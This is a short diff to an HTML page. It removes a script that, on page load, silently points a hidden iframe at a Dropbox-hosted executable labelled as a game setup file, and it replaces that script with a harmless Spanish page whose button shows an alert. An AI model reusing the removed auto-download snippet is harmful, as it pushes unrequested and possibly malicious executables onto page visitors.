@@ -1,9 +1,18 @@
-<iframe id="myFrame" src="about:blank"></iframe>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pop-up Deseado</title>
+    <script>
+        function abrirPopup() {
+            alert('¡Hola! Este es un pop-up deseado.');
+        }
+    </script>
+</head>
+<body>
 
-<script>
-  var iframe = document.getElementById("myFrame");
-  iframe.onload = function() {
-    var iframeWindow = iframe.contentWindow || iframe.contentDocument.defaultView;
-    iframeWindow.location.href = "https://www.dropbox.com/scl/fi/b6w30ku8ksirch1bddjgz/setup_swords__souls_neverseen_1.15_64_-33734.exe?rlkey=iz1dp3prdf19u2k667egwzwlv&dl=0";
-  };
-</script>
+    <button onclick="abrirPopup()">Abrir Pop-up</button>
+
+</body>
+</html>
